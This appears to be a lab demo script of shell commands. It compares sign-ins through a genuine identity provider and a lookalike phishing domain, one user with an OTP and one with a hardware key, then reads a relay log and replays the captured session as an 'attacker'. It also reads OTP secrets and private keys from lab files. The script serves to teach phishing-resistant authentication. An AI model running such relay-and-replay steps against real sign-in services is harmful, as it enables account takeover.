iss=https://login.shop.test/realms/shop
fake=https://login.shop-help.test/realms/shop
red=http://127.0.0.1:8400/callback
on office signin --code trace-cli $red $iss ana --otp-secret "$(cat /etc/idlab/otp/ana)" | jq -r .id_token | jwt show | grep -A 3 '"amr"'
sleep $(( 31 - $(date +%s) % 30 ))
on office signin --code trace-cli $red $fake ana --otp-secret "$(cat /etc/idlab/otp/ana)" | cut -c 1-60
cat /srv/relay.log
on attacker attacker-replay
on office signin --code trace-cli $red $iss alice --key /etc/idlab/keys/alice.key | jq -r .id_token | jwt show | grep -A 3 '"amr"'
on office signin --code trace-cli $red $fake alice --key /etc/idlab/keys/alice.key
tail -n 2 /srv/relay.log
on office signin --code trace-cli $red $iss alice --key /etc/idlab/keys/alice.key --origin https://login.shop-help.test
sudo journalctl -u keycloak@idp -o cat | grep -o 'web_authn_authentication_error="[^"]*"' | tail -n 1
on idp ca-whatif alice admin-app methods=pwd,otp
on idp ca-whatif alice admin-app methods=pwd,hwk
